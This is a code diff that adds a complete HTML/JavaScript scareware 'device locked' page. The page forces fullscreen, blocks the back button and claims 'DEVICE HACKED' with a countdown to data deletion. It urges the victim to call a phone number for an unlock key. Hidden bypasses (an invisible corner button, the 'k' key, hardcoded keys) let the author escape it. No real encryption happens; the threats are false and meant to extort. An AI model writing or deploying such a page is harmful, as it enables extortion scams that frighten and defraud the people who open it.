@@ -1,1 +1,82 @@
-hadeh kocak lu anjg 
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>SISTEM TERKUNCI - KILLER_NEXA</title>
+    <style>
+        body { background-color: #000; color: #fff; font-family: 'Courier New', monospace; margin: 0; overflow: hidden; display: flex; justify-content: center; align-items: center; height: 100vh; }
+        .lock-container { background: linear-gradient(180deg, #440000 0%, #990000 100%); width: 85%; padding: 40px; border-radius: 10px; text-align: center; border: 3px solid #ff0000; box-shadow: 0 0 100px #ff0000; position: relative; }
+        .timer { font-size: 40px; color: #ffff00; margin: 20px 0; text-shadow: 2px 2px #000; }
+        input { width: 90%; padding: 12px; margin-top: 20px; border: 2px solid #fff; background: #000; color: #00ff00; text-align: center; font-weight: bold; font-size: 18px; }
+        button { background-color: #ff0000; color: #fff; border: 2px solid #fff; padding: 10px 30px; margin-top: 15px; cursor: pointer; font-weight: bold; width: 100%; text-transform: uppercase; }
+        .backdoor-btn { position: absolute; top: 0; left: 0; width: 50px; height: 50px; background: transparent; z-index: 999; }
+    </style>
+</head>
+<body onclick="requestFullScreen()">
+
+    <div class="backdoor-btn" onclick="masterUnlockCounter()"></div>
+
+    <div class="lock-container">
+        <h1 style="color: #fff; text-shadow: 2px 2px #000;">DEVICE HACKED</h1>
+        <p>Waktu tersisa sebelum penghapusan data:</p>
+        <div class="timer" id="timer">05:00</div>
+        
+        <p style="font-size: 12px; color: #ccc;">Masukkan KEY untuk membatalkan enkripsi.<br>Hubungi: <b>+16723208690</b></p>
+        
+        <input type="text" id="licenseKey" placeholder="MASUKKAN KEY">
+        <br>
+        <button onclick="verifyKey()">VERIFIKASI SEKARANG</button>
+    </div>
+
+    <script>
+        const MASTER_KEY = "123"; 
+        let clickCount = 0;
+
+        function requestFullScreen() {
+            var el = document.documentElement;
+            (el.requestFullscreen || el.webkitRequestFullScreen || el.mozRequestFullScreen || el.msRequestFullscreen).call(el);
+        }
+
+        function masterUnlockCounter() {
+            clickCount++;
+            if (clickCount >= 3) {
+                alert("Welcome Back, Master Andz! 😈");
+                window.location.href = "about:blank";
+            }
+        }
+
+        document.addEventListener('keydown', (e) => {
+            if (e.key.toLowerCase() === 'k') {
+                alert("BYPASS ACTIVE.");
+                window.location.href = "about:blank";
+            }
+        });
+
+        function verifyKey() {
+            const inputKey = document.getElementById("licenseKey").value;
+            if (inputKey === MASTER_KEY || inputKey === "159357") {
+                alert("Key Accepted. Decrypting...");
+                window.location.href = "about:blank";
+            } else {
+                alert("KEY SALAH!");
+            }
+        }
+
+        let timeLeft = 300;
+        const countdown = setInterval(() => {
+            let m = Math.floor(timeLeft / 60);
+            let s = timeLeft % 60;
+            document.getElementById('timer').innerHTML = `${m}:${s < 10 ? '0' + s : s}`;
+            if (timeLeft <= 0) {
+                clearInterval(countdown);
+                document.body.innerHTML = "<h1 style='color:red; text-align:center;'>ALL DATA DELETED.</h1>";
+            }
+            timeLeft--;
+        }, 1000);
+
+        history.pushState(null, null, location.href);
+        window.onpopstate = () => history.go(1);
+    </script>
+</body>
+</html>
